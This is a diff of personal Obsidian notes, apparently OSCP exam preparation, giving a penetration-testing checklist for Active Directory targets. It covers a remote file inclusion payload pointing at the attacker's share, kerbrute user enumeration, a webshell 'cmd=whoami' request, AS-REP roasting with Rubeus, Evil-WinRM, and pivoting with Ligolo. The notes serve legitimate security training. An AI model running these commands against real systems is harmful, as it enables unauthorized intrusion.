@@ -1,4 +1,3 @@
-
 ## Discovering Domain Name
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -53,6 +52,8 @@ const command = `?page=//${KaliIP}/share/test.txt`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+[[inetpub]]
+
 ---
 ## Port 88 : Kerberos
 
@@ -67,7 +68,6 @@ const command = `kerbrute userenum -d ${discoveredDomain} /usr/share/seclists/Us
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-
 ## looking for Users : looksupid --rid-brute
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -127,6 +127,18 @@ const command = `curl ${discoveredDomain}/styles/shell.php?cmd=whoami`;
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
+## Port 5985 : Evil-WinRM
+
+```
+net user C.Bum
+```
+
+![[Pasted image 20260913095952.png]]
+
+If not a member of Remote Users, CANNOT Evil-WinRM
+
+---
+
 ## Only User Obtained : 
 
 ## Check Pre-Auth As-rep Kerberoasting
@@ -390,6 +402,16 @@ Transfer [[Rubeus.exe]] into VICTIM TARGET
 Once Creds are obtained, use [[Runas]]
 
 ---
+
+# Pivoting
+
+Check which ports are open in the target but not on KALI ATTACKER
+```
+netstat -ano | findstr LISTENING
+```
+
+If HTTP server is only accessible enough, [[Ligolo]]
+
 # Lateral Movement
 
 [[Runas]]
